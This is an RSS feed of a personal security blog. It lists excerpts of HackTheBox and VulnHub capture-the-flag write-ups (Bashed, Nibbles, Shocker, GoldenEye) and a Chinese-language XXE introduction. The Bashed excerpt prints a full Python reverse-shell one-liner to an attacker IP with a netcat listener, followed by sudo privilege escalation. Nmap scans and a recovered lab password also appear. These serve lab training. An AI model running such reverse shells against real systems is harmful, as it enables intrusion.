<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Introduction on xf3n9 secwalk</title>
    <link>https://xf3n9.github.io/</link>
    <description>Recent content in Introduction on xf3n9 secwalk</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 02 Apr 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://xf3n9.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Bashed</title>
      <link>https://xf3n9.github.io/docs/hackthebox/bashed/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/hackthebox/bashed/</guid>
      <description>HTB: Bashed#Recon#http://10.10.10.68 有一篇关于phpbash的文章
gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /dev页面：
点击phpbash.php给出一个页面shell，即phpbash
Phpbash#尝试进入/home目录下的用户目录，成功找到user.txt
Shell Upgrade#在phpbash中准备：
python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.157&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; 在kali中监听：
nc -nvlp 4444# connect to local from remotepython -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;# pty shell PrivEsc#sudo -lUser www-data may run the following commands on bashed:(scriptmanager : scriptmanager) NOPASSWD: ALL# switch user to scriptmanagersudo -u scriptmanager /bin/bashls -l /scripts# autorun py gen txttest.</description>
    </item>
    
    <item>
      <title>Brainfuck</title>
      <link>https://xf3n9.github.io/docs/hackthebox/brainfuck/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/hackthebox/brainfuck/</guid>
      <description>HTB: Brainfuck#</description>
    </item>
    
    <item>
      <title>Inject</title>
      <link>https://xf3n9.github.io/docs/hackthebox/inject/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/hackthebox/inject/</guid>
      <description>HTB: Inject#</description>
    </item>
    
    <item>
      <title>Nibbles</title>
      <link>https://xf3n9.github.io/docs/hackthebox/nibbles/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/hackthebox/nibbles/</guid>
      <description>HTB: Nibbles#Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing sudo on a file that is world-writable.
nmap#An initial nmap scan showed only web/http (80) and ssh (22):
$ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#The root page simply returns a “hello world” message</description>
    </item>
    
    <item>
      <title>Shocker</title>
      <link>https://xf3n9.github.io/docs/hackthebox/shocker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/hackthebox/shocker/</guid>
      <description>HTB: Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.</description>
    </item>
    
    <item>
      <title>Golden-Eye</title>
      <link>https://xf3n9.github.io/docs/vulnhub/golden-eye/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/docs/vulnhub/golden-eye/</guid>
      <description>Vulnhub: GoldenEye#Recon#nmap## 主机存活扫描：nmap -sn 10.10.8.0/24# 全端口扫描：nmap --min-rate 10000 -Pn -p- 10.10.8.152PORT STATE SERVICE25/tcp open smtp80/tcp open http55006/tcp open unknown55007/tcp open unknown# 端口服务扫描：nmap -A -sV -T5 10.10.8.152 Web 80#1) 访问80端口，提示Naviagate to /sev-home/ to login// 新标签页打开 http://10.10.8.152/sev-home 2) F12开发者工具，看到terminal.js文件，点击查看 // 获得两个用户名：Boris Natalya// 一个encoded p@ssword：&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;3) URL encode解码工具：// Burpsuite--Decoder--Decode as HTML获得密码：InvincibleHack3r Login</description>
    </item>
    
    <item>
      <title>Pikachu</title>
      <link>https://xf3n9.github.io/posts/pikachu/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      
      <guid>https://xf3n9.github.io/posts/pikachu/</guid>
      <description>XXE
在了解XXE之前，先了解下XML
XML是可扩展标记语言，英文全称：eXtensible Markup Language
我们先来具体了解一下XML到底是什么？然后再探讨这种语言设计的目的。
第一部分：XML声明。定义XML版本（1.0），或与编码一起定义（UTF-8：万国码）&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;第二部分：DTD文档类型定义。&amp;lt;!DOCTYPE node[]&amp;gt;第三部分：XML元素&amp;lt;node&amp;gt;&amp;lt;to&amp;gt;Dave&amp;lt;/to&amp;gt;&amp;lt;from&amp;gt;Tom&amp;lt;/from&amp;gt;&amp;lt;body&amp;gt;You are a good man&amp;lt;/body&amp;gt;&amp;lt;/node&amp;gt; 看起来，XML由标签构成，属于树形结构。与HTML十分相像，但用途却不同。XML主要用于传输存储数据，而HTML用来显示数据外观，如标记段落、标题等。
DTD，文档类型定义，英文全称：Document Type Definition，应该是最容易被忽视的部分。
！内部DTD&amp;lt;!DOCTYPE 根元素 [元素声明]&amp;gt;！外部DTD&amp;lt;!DOCTYPE 根元素 SYSTEM [URI]&amp;gt;！公共DTD&amp;lt;!DOCTYPE 根元素 PUBLIC [公共URI]&amp;gt; XXE，XML外部实体注入漏洞，英文全称：XML eXternal Entity Injection
漏洞原理：通过向Server提交指定的XML实体内容请求，服务器解析实体内容并进行响应所产生的漏洞。
现状：目前多数语言默认禁止XML函数解析外部实体，此后漏洞因此得以避免。以PHP为例，libxml用来解析XML，但在PHP&amp;gt;=2.9.0的版本中已默认禁止解析外部实体。
模拟XXE漏洞，一般通过手动指定libxml_noent选项开启外部实体解析。</description>
    </item>
    
  </channel>
</rss>
